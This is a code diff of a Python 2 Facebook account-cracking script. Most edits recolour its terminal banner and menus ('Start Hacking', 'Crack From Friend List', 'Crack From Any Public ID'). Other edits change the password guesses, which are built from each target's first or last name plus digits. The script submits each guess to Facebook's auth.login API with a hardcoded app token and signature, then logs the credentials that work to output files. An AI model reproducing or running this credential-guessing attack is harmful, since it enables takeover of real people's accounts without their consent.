@@ -57,8 +57,8 @@ logo = """ -----------------------------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mWASEEM MALIK
-\033[1;96mInstagram \033[1;93m: \033[1;Wassi
-\033[1;96mFacebook  \033[1;93m: \033[1; RAMZAN
+\033[1;96mInstagram \033[1;93m: \033[1;92mWassi
+\033[1;96mFacebook  \033[1;93m: \033[1;92mRAMZAN
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
 \033[1;91m======================================="""
 
@@ -80,12 +80,12 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mWASEEM MALIK
-\033[1;96mInstagram \033[1;93m: \033[1;92mWASSI
-\033[1;96mFacebook  \033[1;93m: \033[1;92m RAMZAN
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
+\033[1;97mAuthor  \033[1;93m: \033[1;92mWASEEM MALIK
+\033[1;97mInstagram \033[1;93m: \033[1;92mWASSI
+\033[1;97mFacebook  \033[1;93m: \033[1;92m RAMZAN
+\033[1;97mGithub \033[1;93m: \033[1;921https://Github.com/Therana/zero
+\033[1;97m======================================="""
+print " \x1b[1;92m============================================================="
 
 CorrectUsername = "waseem"
 CorrectPassword = "waseem"
@@ -189,11 +189,11 @@ def menu():
 	os.system("clear")
 	print logo
 	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Hacking"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+	print "\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;91m[\033[1;96m✓\033[1;92m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
+	print 42*"\033[1;91m="
+	print "\x1b[1;91m[\x1b[1;97m1\x1b[1;97m]\x1b[1;93m Start Hacking"
+	print "\x1b[1;91m[\x1b[1;93m0\x1b[1;97m]\x1b[1;91m Exit            "
 	pilih()
 
 
@@ -226,16 +226,16 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ID"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
+	print "\x1b[1;97m[\x1b[1;96m1\x1b[1;96m]\x1b[1;92m Crack From Friend List"
+	print "\x1b[1;97m[\x1b[1;96m2\x1b[1;96m]\x1b[1;92m Crack From Any Public ID"
+	print "\x1b[1;97m[\x1b[1;96m3\x1b[1;96m]\x1b[1;92m Crack From File"
+	print "\x1b[1;97m[\x1b[1;93m0\x1b[1;96m]\x1b[1;95m Back"
 	pilih_super()
 
 def pilih_super():
 	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if peak =="":
-		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
+		print "\033[1;92m[!] \x1b[1;91mFill in correctly"
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
@@ -316,7 +316,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['first_name']+'12345'
+					pass2 = b['last_name']+'12345'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -330,7 +330,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '123'
+							pass3 = b['last_name'] + '123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -344,7 +344,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = b['first_name'] + '123'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -358,7 +358,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + '786'
+											pass5 = b['first_name'] + '12345'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -372,7 +372,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '1234'
+													pass6 = b['last_name'] + '1234'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -400,7 +400,14 @@ def pilih_super():
 																	cek = open("out/checkpoint.txt", "a")
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass7)
+																	cekpoint.append(user+pass7) 
+																	
+																	
+																	
+																	
+																	
+																	
+																	
 																	
 															
 		except:
